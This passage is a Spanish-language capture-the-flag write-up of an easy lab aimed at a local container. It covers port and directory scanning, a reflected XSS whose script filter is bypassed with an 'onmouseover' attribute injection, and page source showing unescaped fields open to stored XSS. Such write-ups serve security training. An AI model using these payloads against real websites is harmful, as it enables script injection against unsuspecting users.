---
Estado: Completado
Plataforma: Bug Bounty Labs
SO: Linux
Dificultad: Facil
VectorInicial: XSS
Privesc: No
Fecha: 2026-02-23
---
<img width="400" height="245" alt="Pasted image 20260223165234" src="https://github.com/user-attachments/assets/ef2cc6db-96dc-4eab-b5f8-9e1da42c4a18" />

Comenzaremos con una enumeraci├│n de puertos para hacernos una idea de lo que tenemos.

```bash
settarget 172.17.0.2
TARGET establecido: 172.17.0.2

gomap -s $TARGET
­ Scanning 172.17.0.2 (997 ports)

PORT    STATE  SERVICE         VERSION
80      open   http            Apache 2.4.62 (Debian)
5000    open   http            Werkzeug/3.1.3 Python/3.11.2

Host Exposure Summary
- 172.17.0.2 | open ports: 2 | critical: none | exposure: low

Ô£ô Completed scan in 45ms | hosts: 1 | open ports: 2
```

Nos encontramos con 2 puertos abiertos:
- 80 - HTTP con servidor apache
- 5000 - HTTP con posible aplicaci├│n en Python.

Empecemos con visitar la web directamente en el puerto 80 a ver que hay.

Nos encontramos con la pagina por defecto de Apache, as├¡ que vamos a realizar una enumeraci├│n de directorios a ver si vemos algo.

```bash
é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
beta                 (Status: 301) [Size: 307] [--> http://172.17.0.2/beta/]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

Parece que en el directorio */beta/*  tenemos una web.

<img width="995" height="476" alt="Pasted image 20260223160032" src="https://github.com/user-attachments/assets/3deb43f5-8a86-4611-be81-bd501465d569" />

Por lo que vemos es un formulario con una vulnerabilidad de XSS as├¡ que probaremos con lo primero.

```javascript
<script>alert(1)</script>
```

Pero no ocurre nada, aunque al navegar por el c├│digo mediante *CTRL+U*  vemos que si esta ocurriendo algo:

```html
<p>
	<span title="<script>*****(1)</script>">
        Comentario reflejado
    </span>
</p>
```

Hay un filtro para no mostrar las alertas, as├¡ que intentaremos otro m├®todo.

```javascript
" onmouseover=confirm(1) "
```

Este payload permite el XSS y por consiguiente ya tenemos una vulnerabilidad y esta parte finaliza aqu├¡.

Ahora vamos a por el puerto *5000* el cual tiene una web de perritos.

<img width="528" height="487" alt="Pasted image 20260223162627" src="https://github.com/user-attachments/assets/be11ffe8-c1d7-4e33-87c3-67bc598921d8" />

Vamos a registrarnos a ver que podemos encontrar.

Solo tenemos una pagina para a├▒adir nuestras mascotas, esto da a pensar que puede ser un XSS almacenado.

Curiosamente al ver el c├│digo de la pagina nos encontramos con esto:

```html
            <li>
                <!-- Aqu├¡ se elimina el escape, permitiendo la ejecuci├│n de JavaScript si se inyecta c├│digo -->
                <img src="http://www.ert.com" alt="pupy" style="width: 450px; height: 300px;">
                <p>Name: pupy</p> <!-- Uso de 'safe' hace que se renderice como HTML sin escape -->
                <p>Age: 12</p> <!-- Si hay alg├║n intento de inyecci├│n de c├│digo, se ejecutar├í -->
                <p>Breed: 123</p> <!-- Tambi├®n se permite inyecci├│n en la raza -->
            </li>
        
            <li>
                <!-- Aqu├¡ se elimina el escape, permitiendo la ejecuci├│n de JavaScript si se inyecta c├│digo -->
                <img src="http://www.ert.com" alt="pupy" style="width: 450px; height: 300px;">
                <p>Name: pupy</p> <!-- Uso de 'safe' hace que se renderice como HTML sin escape -->
                <p>Age: 12</p> <!-- Si hay alg├║n intento de inyecci├│n de c├│digo, se ejecutar├í -->
                <p>Breed: 123</p> <!-- Tambi├®n se permite inyecci├│n en la raza -->
            </li>
```

Lo cual ya nos indica donde podremos inyectar el c├│digo.

Esto es un gran fallo puesto que permite inyecciones sin la necesidad de hacer ataques a ciegas puesto que nos esta indicando en el lugar donde tenemos que atacar.


